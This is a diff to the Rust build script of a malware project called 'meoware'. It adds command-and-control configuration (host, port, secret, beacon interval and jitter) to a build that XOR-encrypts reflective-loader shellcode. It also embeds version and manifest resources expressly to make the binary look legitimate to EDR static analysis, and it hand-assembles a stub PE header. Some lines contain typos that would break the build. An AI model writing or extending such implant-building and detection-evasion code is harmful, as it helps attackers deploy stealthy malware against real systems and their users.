@@ -37,7 +37,7 @@ fn main() {
         // Look for meoware.dll in target/release/
         let dll_path = build_loader::find_meoware_dll();
         if let Some(dll) = dll_path {
-            println!("cargo:warning=Found meoware.dll — generating PIC reflective loader shellcode");
+            println!("cargo:warning=Found meoware.dll - generating PIC reflective loader shellcode");
             println!("cargo:rerun-if-changed={}", dll.display());
             let dll_bytes = fs::read(&dll).unwrap();
             let sc = build_loader::generate_reflective_shellcode(&dll_bytes, &key);
@@ -58,7 +58,76 @@ fn main() {
     let encrypted_sc = xor_encrypt(&shellcode, &key);
     fs::write(out_path.join("shellcode.enc"), &encrypted_sc).unwrap();
 
-    unimplemented!("TODO: C2 Config")
+    // C2 Configuration
+    let c2_host = env::var("C2_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
+    let c2_port: u16 = env::var("C2_PORT").ok().and_then(|s| s.parse().ok()).unwrap_or(8443);
+    let c2_https: bool = env::var("C2_HTTPS").map(|s| s == "true").unwrap_or(false);
+    let c2_secret = env::var("C2_SECRET").unwrap_or_else(|_| "super-secret-key".to_string());
+    let c2_interval: u64 = env::var("C2_INTERVAL").ok().and_then(|s| s.parse().ok()).unwrap_or(60000); // 60 second
+    let c2_jitter: u8 = env::var("C2_JITTER").ok().and_then(|s| s.parse().ok()).unwrap_or(20);
+
+    // Generate UTF-16 host array
+    let host_u16: Vec<String> = c2_host.encode_utf16()
+        .chain(core::iter::once(0u16)) // null terminator
+        .map(|c| format!("0x{:04X}", c)).collect();
+    let host_len = host_u16.len();
+    let host_array = host_u16.join(", ");
+
+    // XOR encrypt the secret with the build key
+    let secret_enc = xor_encrypt(c2_secret.as_bytes(), &key);
+    let secret_arr: Vec<String> = secret_enc.iter().map(|b| format!("0x{:04X}", b)).collect();
+    let secret_len = secret_arr.len();
+    let secret_array = secret_arr.join(", ");
+
+    let c2_config = format!(r#"
+        const C2_HOST: [u16; {host_len}] = [{host_array}];
+        const C2_PORT: u16 = {c2_port};
+        const C2_HTTPS: bool = {c2_https};
+        const C2_SECRET_ENC: [u8; {secret_len}] = [{secret_array}];
+        const C2_INTERVAL: u64 = {c2_interval};
+        const C2_JITTER: u8 = {c2_jitter};
+    "#);
+    fs::write(out_path.join("c2.config.rs"), c2_config).unwrap();
+
+    // Make the PE look legitimate to EDR static analysis
+    let crate_dir = PathBuf::from(env::var("CARGO_MAINFEST_DIR").unwrap());
+    let rc_file = crate_dir.join("meoware.rc");
+    let mainfest_file = crate_dir.join("meoware.mainfest");
+    if rc_file.exists() && mainfest_file.exists() {
+        // using embed resource approach: compile .rc -> res -> link
+        let res_path = out_path.join("meoware.res");
+
+        // Try to find rc.exe in WindwosSDK
+        let rc_exe = find_rc_compiler();
+        if let Some(rc_path) = rc_exe {
+            let status = std::process::Command::new(&rc_path)
+                .current_dir(&crate_dir)
+                .arg("nologo")
+                .arg("/fo")
+                .arg(res_path.to_str().unwrap())
+                .arg(rc_file.to_str().unwrap())
+                .status();
+
+            if let Ok(s) = status {
+                if s.success() {
+                    println!("cargo:rustc-link-arg-bins={}", res_path.display());
+                    println!("cargo:warning=Embedded version info + manifest resource");
+                } else {
+                    println!("cargo:warning=RC compiler failed - building without version info");
+                }
+            }
+        }
+    }
+
+    println!("cargo:rerun-if-changed=build.rs");
+    println!("cargo:rerun-if-env-changed=PAYLOAD_PE_PATH");
+    println!("cargo:rerun-if-env-changed=PAYLOAD_SHELLCODE_PATH");
+    println!("cargo:rerun-if-env-changed=C2_HOST");
+    println!("cargo:rerun-if-env-changed=C2_PORT");
+    println!("cargo:rerun-if-env-changed=C2_HTTPS");
+    println!("cargo:rerun-if-env-changed=C2_SECRET");
+    println!("cargo:rerun-if-env-changed=C2_INTERVAL");
+    println!("cargo:rerun-if-env-changed=C2_JITTER");
 }
 
 fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
@@ -66,6 +135,38 @@ fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
         .enumerate()
         .map(|(i, b)| b ^ key[i % key.len()])
         .collect()
+}
+
+fn find_rc_compiler() -> Option<PathBuf> {
+    // Common WindwosSDK paths
+    let sdk_roots = [
+        r"C:\Program Files (x86)\Windows Kits\10\bin",
+        r"C:\Program Files\Windows Kits\10\bin",
+    ];
+
+    for root in &sdk_roots {
+        let root_path = PathBuf::from(root);
+        if !root_path.exists() { continue }
+        // find latest version directory
+        if let Ok(entries) = fs::read_dir(&root_path) {
+            let mut versions: Vec<_> = entries.filter_map(|e| e.ok())
+                .filter(|e| e.file_type().map(|t| t.is_dir()).unwrap_or(false))
+                .filter(|e| {
+                    let name = e.file_name();
+                    let s = name.to_string_lossy();
+                    s.starts_with("10.")
+                }).collect();
+            versions.sort_by(|a, b| b.file_name().cmp(&a.file_name()));
+
+            for version in versions {
+                let rc = version.path().join("x64").join("rc.exe");
+                if rc.exists() {
+                    return Some(rc);
+                }
+            }
+        }
+    }
+    None
 }
 
 fn generate_build_key() -> Vec<u8> {
@@ -87,11 +188,11 @@ fn generate_ghost_stub() -> Vec<u8> {
     let mut pe = vec![0u8; 0x400];
 
     // DOS Header (0x000x3F)
-    w16(&mut pe, 0x00, 0x5A4D);            // e_magic = "MZ"
-    w32(&mut pe, 0x3C, 0x80);              // e_lfanew -> PE header
+    w16(&mut pe, 0x00, 0x5A4D);             // e_magic = "MZ"
+    w32(&mut pe, 0x3C, 0x80);               // e_lfanew -> PE header
 
     // PE Signature (0x80)
-    w32(&mut pe, 0x80, 0x00004550);       // "PE\0\0"
+    w32(&mut pe, 0x80, 0x00004550);         // "PE\0\0"
 
     // COFF File Header (0x84, 20 bytes)
     w16(&mut pe, 0x84, 0x8664);             // Machine = AMD64
@@ -123,12 +224,12 @@ fn generate_ghost_stub() -> Vec<u8> {
     w32(&mut pe, 0x104, 16);                // NumberOfRvaAndSizes
 
     // DataDirectory[1] = Import Directory  (offset 0x108 + 1*8 = 0x110)
-    w32(&mut pe, 0x110, 0x1020);           // VirtualAddress
-    w32(&mut pe, 0x114, 40);               // Size (1 entry + null)
+    w32(&mut pe, 0x110, 0x1020);            // VirtualAddress
+    w32(&mut pe, 0x114, 40);                // Size (1 entry + null)
 
     // DataDirectory[12] = IAT              (offset 0x108 + 12*8 = 0x168)
-    w32(&mut pe, 0x168, 0x1060);           // VirtualAddress
-    w32(&mut pe, 0x16C, 16);               // Size
+    w32(&mut pe, 0x168, 0x1060);            // VirtualAddress
+    w32(&mut pe, 0x16C, 16);                // Size
 
     // Section Header: .text (0x188, 40 bytes)
     pe[0x188..0x190].copy_from_slice(b".text\0\0\0");
